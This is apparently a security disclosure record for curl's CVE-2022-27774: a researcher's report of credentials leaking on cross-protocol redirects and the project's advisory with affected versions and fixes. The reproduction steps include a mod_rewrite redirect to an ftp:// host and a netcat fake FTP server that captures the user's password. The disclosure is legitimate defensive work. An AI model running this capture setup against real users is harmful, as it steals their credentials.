  "vulnerability_information": "## Summary:\ncurl/libcurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.\n\n## Steps To Reproduce:\n\n  1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod_rewrite:\n     ```\n    RewriteCond %{HTTP_USER_AGENT} \"^curl/\"\n    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]\n     ```\n  2. Capture credentials at `secondsite.tld` for example with:\n     ```\n     while true; do echo -e \"220 pocftp\\n331 plz\\n530 bye\" | nc -v -l -p 9999; done\n     ```\n  3. `curl -L --user foo  https://firstsite.tld/redirectpoc`\n  4. The entered password is visible in the fake FTP server:\n```\nListening on 0.0.0.0 9999\nConnection received on somehost someport\nUSER foo\nPASS secretpassword\n```\n\nThere are several issues here:\n1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:\n> When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.\n2. The redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.\n\nIn addition, TLS SRP user credentials (`CURLOPT_TLSAUTH_USERNAME` and `CURLOPT_TLSAUTH_PASSWORD`) are also leaked on redirects.\n\n## Impact\n\nLeak of confidential information (user credentials).",

      "content": "Curl Advisory: Credential leak on redirect\nProject curl Security Advisory, April 27th 2022\n\nVULNERABILITY\ncurl follows HTTP(S) redirects when asked to. curl also supports authentication. When a user and password are provided for a URL with a given hostname, curl makes an effort to not pass on those credentials to other hosts in redirects unless given permission with a special option.\n\nThis \"same host check\" has been flawed all since it was introduced. It does not work on cross protocol redirects and it does not consider different port numbers to be separate hosts. This leads to curl leaking credentials to other servers when it follows redirects from auth protected HTTP(S) URLs to other protocols and port numbers. It could also leak the TLS SRP credentials this way.\n\nBy default, curl only allows redirects to HTTP(S) and FTP(S), but can be asked to allow redirects to all protocols curl supports.\n\nWe are not aware of any exploit of this flaw.\n\nINFO\nThis flaw was added in curl 4.9 with the introduction of --location and has been present in all libcurl versions ever released. In July 2000 in the curl 7.1.1 release, this commit was the first version that attempted to avoid this, but the check has been bad since then.\n\nThe Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2022-27774 to this issue.\n\nCWE-522: Insufficiently Protected Credentials\nSeverity: Medium\n\nAFFECTED VERSIONS\nAffected versions: curl 4.9 to and including 7.82.0\nNot affected versions: curl < 4.9 and curl >= 7.83.0\nNote that libcurl is used by many applications, but not always advertised as such.\n\nTHE SOLUTION\nThere are two separate patches to apply for CVE-2022-27774: the main one and the SRP follow-up.\n\nRECOMMENDATIONS\nWe suggest you take one of the following actions immediately, in order of preference:\nA - Upgrade curl and libcurl to version 7.83.0\nB - Apply the patches to your version and rebuild\nC - Switch off curl's automatic redirect following\n\nTIME LINE\nIt was first reported to the curl project on April 18 2022. We contacted distros@openwall on April 19.\nlibcurl 7.83.0 was released on April 27 2022, coordinated with the publication of this advisory.\n\nCREDITS\nReported by Harry Sintonen.\nThanks a lot!\n\nLink to the advisory: https://curl.se/docs/CVE-2022-27774.html",
